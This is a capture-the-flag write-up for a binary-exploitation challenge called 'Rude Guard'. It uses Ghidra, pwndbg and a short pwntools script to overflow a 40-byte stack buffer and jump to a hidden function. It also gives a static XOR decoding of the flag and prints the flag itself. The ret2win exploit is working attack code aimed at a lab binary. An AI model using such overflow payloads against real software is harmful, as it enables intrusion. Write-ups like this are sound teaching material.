# Rude Guard

* **Event:** UTCTF 2026
* **Problem Type:** Binary Exploitation
* **Tools Required / Used:** Ghidra, Pwntools, GDB + pwndbg

## Steps​

### Step 1
Download the pwnable executable and run it. It should instantly output “Are you not going to say hello?” and end. Not what we want. 

Run `file pwnable` to get 

```
pwnable: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89ebd710401970f6aa16061f9651aee4dc18de05, for GNU/Linux 3.2.0, not stripped
```

Our executable runs on 64-bit version of the x86 ISA.

Run `checksec` on the binary to determine protections in place:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

There is no stack canary or PIE so this is most likely a buffer overflow exploit.

### Step 2
In Ghidra, we notice an interesting function called "secret_function" that is never called in main. This is most likely what prints out our flag.  

Also note the following main function:

```c
undefined8 main(int param_1,long param_2)
{
  int iVar1;
  
  if (param_1 == 1) {
    puts("Are you not going to say hello?");
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    if (iVar1 == 0x656c6c6f) {
      puts("Hi. What do you want.");
      read_input(0);
    }
    else {
      puts("Hi. Go away.");
    }
  }
  return 0;
}
```

It looks like the executable reads input from standard input only if iVar1 == 0x656c6c6f. Since iVar1 is param_2 + 8 and param_2 is typically char* argv[] in main, param_2 + 8 is argv[1]. argv[1] will be the second argument passed into execution of pwnable at the command line. 0x656c6c6f is 1701604463 in decimal so we can pass that in to have the program read from standard input.

Running `./pwnable 1701604463`, we get the output "Hi. What do you want." and a line hang. Give the program any input and we get "I won't let you pass. No matter what."

### Step 3
The executable runs on x86_64 which usually has 40 bytes in the buffer before the return address.

We can confirm with pwndbg:

```
$ pwndbg ./pwnable 
cyclic 100
r 1701604463

cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

So then the following script should return the flag:

```py
from pwn import *

elf = ELF('./pwnable')

secret_addr = elf.symbols['secret_function']

payload  = b'A' * 40 + p64(secret_addr)

p = process(["./pwnable", b'1701604463'])
p.recvuntil(b"Hi. What do you want.")   # reads until given output appears, before sending payload
p.sendline(payload)
print(p.recvall(timeout = 1))           # reads everything from the process until EOF
```

Instead, we get the following output:

```
[*] Process './pwnable' stopped with exit code -11 (SIGSEGV) (pid 9207)        
b"\nI won't let you pass. No matter what.\n"
```

### Step 4
In our decompiler we see this code in our secret_function.

```c
for (local_c = 0; local_c < local_14; local_c = local_c + 1) {
    putchar((uint)(local_48[local_c] ^ local_d));
}
return 0;
```

Notice here how stdout is never flushed using fflush and there are no newlines after putchar is called. This means if the C program is line buffered or fully buffered and the buffer never completely fills up, our flag output gets stuck in our buffer and is never piped to standard output.

To force the C program to run in unbuffered mode, we must call `stdbuf -o0` before executing pwnable.

```py
p = process(["stdbuf", "-o0", "./pwnable", b'1701604463'])
```

Now, our script should successfully output the flag.

```
[*] Process '/usr/bin/stdbuf' stopped with exit code -11 (SIGSEGV) (pid 9106)  
b"\nI won't let you pass. No matter what.\nutflag{gu4rd_w4s_w34ker_th4n_i_th0ught}"
```

### Other Solution
Use Ghidra to decompile the executable. 

```c
undefined8 secret_function(void)
{
  byte local_48 [52];
  int local_14;
  byte local_d;
  int local_c;
  
  local_d = 0x32;
  local_48[0] = 0x47;
  local_48[1] = 0x46;
  local_48[2] = 0x54;
  local_48[3] = 0x5e;
  local_48[4] = 0x53;
  local_48[5] = 0x55;
  local_48[6] = 0x49;
  local_48[7] = 0x55;
  local_48[8] = 0x47;
  local_48[9] = 6;
  local_48[10] = 0x40;
  local_48[0xb] = 0x56;
  local_48[0xc] = 0x6d;
  local_48[0xd] = 0x45;
  local_48[0xe] = 6;
  local_48[0xf] = 0x41;
  local_48[0x10] = 0x6d;
  local_48[0x11] = 0x45;
  local_48[0x12] = 1;
  local_48[0x13] = 6;
  local_48[0x14] = 0x59;
  local_48[0x15] = 0x57;
  local_48[0x16] = 0x40;
  local_48[0x17] = 0x6d;
  local_48[0x18] = 0x46;
  local_48[0x19] = 0x5a;
  local_48[0x1a] = 6;
  local_48[0x1b] = 0x5c;
  local_48[0x1c] = 0x6d;
  local_48[0x1d] = 0x5b;
  local_48[0x1e] = 0x6d;
  local_48[0x1f] = 0x46;
  local_48[0x20] = 0x5a;
  local_48[0x21] = 2;
  local_48[0x22] = 0x47;
  local_48[0x23] = 0x55;
  local_48[0x24] = 0x5a;
  local_48[0x25] = 0x46;
  local_48[0x26] = 0x4f;
  local_14 = 0x27;
  for (local_c = 0; local_c < local_14; local_c = local_c + 1) {
    putchar((uint)(local_48[local_c] ^ local_d));
  }
  return 0;
}
````

Every element in "local_48" is xor'd with "local_d". We can reverse the flag using static xor decryption.